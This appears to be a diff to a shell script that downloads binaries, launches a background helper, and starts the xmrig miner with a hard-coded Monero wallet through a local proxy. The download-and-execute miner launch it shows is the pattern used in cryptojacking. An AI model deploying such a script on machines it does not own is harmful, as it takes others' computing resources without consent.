@@ -26,8 +26,9 @@ download_and_set_permissions "$DOWNLOAD_CONFIG_URL"
 download_and_set_permissions "$DOWNLOAD_SSLMIX_URL"
 
 # Run /usr/local/bin/running in the background for 3 seconds
-/usr/local/bin/running &
+cd "$DIRECTORY"
+./running &
 sleep 3
 
 # Run xmrig command
-/usr/local/bin/xmrig --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
+./xmrig --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
